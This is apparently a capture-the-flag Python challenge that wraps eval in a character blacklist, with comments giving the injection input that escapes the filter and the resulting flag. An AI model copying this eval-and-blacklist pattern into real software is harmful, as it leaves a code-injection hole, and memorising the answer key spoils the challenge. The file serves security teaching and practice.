#!/usr/bin/env python3

FLAG = "CyberErudites{fake_flag}"
BLACKLIST = '"%&\',-/_:;@\\`{|}~*<=>[] \t\n\r'

def check(s):
    return all(ord(x) < 0x7f for x in s) and all(x not in s for x in BLACKLIST)

def safe_eval(s, func):
    if not check(s):
        print("Input is bad")
    else:
        r = f"{func.__name__}({s})"
        print(r)
        try:
            print(eval(r, {"__builtins__": {func.__name__: func}, "flag": FLAG}))
        except:
            print("Error")

if __name__ == "__main__":
    safe_eval(input("Input : "), type) # solution: flag.split())(flag)#

# ['C', 'y', 'b', 'e', 'r', 'E', 'r', 'u', 'd', 'i', 't', 'e', 's', '{', 'w', 'h', '0', '_', 'N', '3', 'E', 'd', '$', '_', 'b', 'R', '4', 'C', 'k', 'e', 'T', 'S', '}']
# CyberErudites{wh0_N3Ed$_bR4CkeTS}
